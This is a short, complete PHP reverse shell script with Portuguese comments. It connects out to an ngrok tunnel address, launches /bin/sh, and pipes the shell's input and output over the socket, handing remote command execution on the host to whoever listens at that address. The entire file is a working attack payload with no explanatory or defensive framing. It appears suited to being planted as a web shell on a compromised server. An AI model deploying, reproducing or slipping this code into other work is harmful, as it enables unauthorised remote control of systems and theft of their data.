<?php
$ip = '0.tcp.sa.ngrok.io'; // Substitua por seu IP
$port = 12676; // Substitua pela sua porta
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', [
    0 => ['pipe', 'r'], // stdin
    1 => ['pipe', 'w'], // stdout
    2 => ['pipe', 'w']  // stderr
], $pipes);

if (is_resource($proc)) {
    while (1) {
        if (feof($sock)) break;
        if (feof($pipes[1])) break;

        $read = [$sock, $pipes[1], $pipes[2]];
        $write = [];
        $except = [];
        stream_select($read, $write, $except, null);

        if (in_array($sock, $read)) {
            $input = fread($sock, 1024);
            fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read)) {
            $output = fread($pipes[1], 1024);
            fwrite($sock, $output);
        }

        if (in_array($pipes[2], $read)) {
            $error = fread($pipes[2], 1024);
            fwrite($sock, $error);
        }
    }
    fclose($sock);
    proc_close($proc);
}
?>
